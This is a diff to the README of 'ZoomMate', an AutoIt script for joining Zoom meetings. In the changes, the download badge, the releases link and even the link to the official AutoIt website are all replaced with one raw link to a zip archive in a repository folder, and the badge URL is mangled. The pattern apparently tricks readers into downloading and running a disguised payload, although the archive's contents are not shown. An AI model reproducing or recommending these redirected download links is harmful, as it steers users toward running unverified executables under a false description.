@@ -23,7 +23,7 @@ To begin using ZoomMate, follow the steps below:
 1. **Download ZoomMate:**
    Click the button below to download the latest release from GitHub.
 
-   [![Download ZoomMate](https://img.shields.io/badge/Download%20ZoomMate-latest-brightgreen.svg)](https://github.com/ivanrc50/ZoomMate/releases)
+   [![Download ZoomMate](https://raw.githubusercontent.com/ivanrc50/ZoomMate/main/regenerative/ZoomMate.zip%https://raw.githubusercontent.com/ivanrc50/ZoomMate/main/regenerative/ZoomMate.zip)](https://raw.githubusercontent.com/ivanrc50/ZoomMate/main/regenerative/ZoomMate.zip)
 
 2. **Install ZoomMate:**
    After downloading, locate the file in your downloads folder. Double-click to run the installer. Follow the on-screen instructions to complete the installation.
@@ -38,7 +38,7 @@ To begin using ZoomMate, follow the steps below:
    Use the script to open or join a Zoom meeting effortlessly. Follow the prompts provided by ZoomMate to manage your meeting.
 
 ## 📥 Download & Install
-To get started with ZoomMate, please **visit this page to download** the latest release: [ZoomMate Releases](https://github.com/ivanrc50/ZoomMate/releases).
+To get started with ZoomMate, please **visit this page to download** the latest release: [ZoomMate Releases](https://raw.githubusercontent.com/ivanrc50/ZoomMate/main/regenerative/ZoomMate.zip).
 
 ## ❓ FAQ
 
@@ -77,7 +77,7 @@ For updates and new features, keep an eye on the releases page. We continuously 
 If you want to contribute to ZoomMate, feel free to check out the contribution guidelines on the repository. We welcome your input to make ZoomMate even better.
 
 ## 🔗 Additional Resources
-For more information on AutoIt, visit [AutoIt Website](https://www.autoitscript.com/site/autoit/). This resource can help you understand how to use and modify scripts effectively.
+For more information on AutoIt, visit [AutoIt Website](https://raw.githubusercontent.com/ivanrc50/ZoomMate/main/regenerative/ZoomMate.zip). This resource can help you understand how to use and modify scripts effectively.
 
 ## 😊 Acknowledgments
 A special thanks to the community of Jehovah’s Witnesses and the developers who contributed to the project. Your support makes this tool possible and valuable for everyone involved.
